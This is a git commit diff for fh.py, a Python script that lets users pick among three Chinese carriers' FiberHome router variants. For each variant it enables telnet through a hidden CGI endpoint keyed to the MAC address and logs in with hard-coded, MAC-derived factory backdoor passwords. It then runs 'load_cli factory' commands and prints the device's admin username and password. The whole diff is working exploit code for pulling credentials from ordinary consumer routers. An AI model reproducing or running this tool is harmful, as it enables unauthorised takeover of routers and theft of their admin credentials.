d5f1b54206d5905e3de9ece787c4c296c5178d54
nu1lkali <iloveflag2019@gmail.com>
2025-03-15 19:10:32 +0800

    Update fh.py
    允许选择不同的运营商。

--- fh.py
+++ fh.py
@@ -23,45 +23,47 @@ def receive(sock):
         if len(data) <= 0:
             break
         try:
-            # 尝试使用utf-8解码
             message = data.decode('utf-8')
         except UnicodeDecodeError:
             try:
-                # 如果utf-8失败，则尝试使用iso-8859-1解码
                 message = data.decode('iso-8859-1')
             except UnicodeDecodeError:
-                # 如果iso-8859-1也失败，则简单地跳过这条消息
                 continue
 
-        if "Success!" in message:
-            # 清理并格式化输出信息
-            admin_name_match = re.search(r'admin_name=([^\r\n]+)', message)
-            admin_pwd_match = re.search(r'admin_pwd=([^\r\n]+)', message)
+        admin_name_match = re.search(r'admin_name=([^\r\n]+)', message)
+        admin_pwd_match = re.search(r'admin_pwd=([^\r\n]+)', message)
 
-            if admin_name_match:
-                print(f"管理员用户名: {admin_name_match.group(1)}")
-            if admin_pwd_match:
-                print(f"管理员密码: {admin_pwd_match.group(1)}")
+        if admin_name_match:
+            print(f"管理员用户名: {admin_name_match.group(1)}")
+        if admin_pwd_match:
+            print(f"管理员密码: {admin_pwd_match.group(1)}")
 
-def start(ip=DEFAULT_IP, mac=DEFAULT_MAC):
-    print(f"当前ip地址为：{ip}")
-    print(f"当前mac地址为：{mac}")
+def start(ip=DEFAULT_IP, mac=DEFAULT_MAC, provider=0):
+    print(f"当前IP地址为：{ip}")
+    print(f"当前MAC地址为：{mac}")
 
     if not is_ip(ip) or not is_mac(mac):
-        print("请检查ip地址和mac地址")
+        print("请检查IP地址和MAC地址")
         return
 
     mac = mac.replace(":", "").upper()
     mac6 = mac[6:]
 
-    try:
-        url = f"http://{ip}/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}"
-        response = requests.get(url)
-        result = response.text.split('(')[1].split(')')[0]
-        print(f"telnet开启情况：{result}")
+    url_templates = [
+        f"http://{ip}/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}",
+        f"http://{ip}/telnet?enable=1&key={mac}",
+        f"http://{ip}:8080/cgi-bin/telnetenable.cgi?key=FH-nE7jA%5m{mac6}&telnetenable=1"
+    ]
 
-        if "成功" in result:
-            print("未检测到开启telnet成功，请手动开启")
+    url = url_templates[provider]
+    print(f"向 {url} 发送请求以开启Telnet服务")
+
+    try:
+        response = requests.get(url)
+        result = response.text
+
+        if "telnet" not in result:
+            print(f"未检测到开启Telnet成功，请手动开启尝试：\n {url}")
             return
 
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -70,7 +72,8 @@ def start(ip=DEFAULT_IP, mac=DEFAULT_MAC):
 
             threading.Thread(target=receive, args=(s,), daemon=True).start()
 
-            for cmd in ["admin\r", f"Fh@{mac6}\r", "load_cli factory\r", "show admin_name\r", "show admin_pwd\r"]:
+            login_cmds = ["admin\r", f"Fh@{mac6}\r"] if provider in [0, 1] else ["telnetadmin\r", f"FH-nE7jA%5m{mac6}\r"]
+            for cmd in [*login_cmds, "load_cli factory\r", "show admin_name\r", "show admin_pwd\r"]:
                 s.send(cmd.encode('ascii'))
                 time.sleep(0.1)
 
@@ -80,4 +83,5 @@ def start(ip=DEFAULT_IP, mac=DEFAULT_MAC):
 if __name__ == '__main__':
     ip = input("请输入IP地址（默认192.168.1.1）：") or DEFAULT_IP
     mac = input("请输入MAC地址（默认38:7A:3C:9C:CD:E0）：") or DEFAULT_MAC
-    start(ip, mac)
+    provider = int(input("请选择运营商 (0 移动, 1 联通, 2 电信，默认0): ") or 0)
+    start(ip, mac, provider)
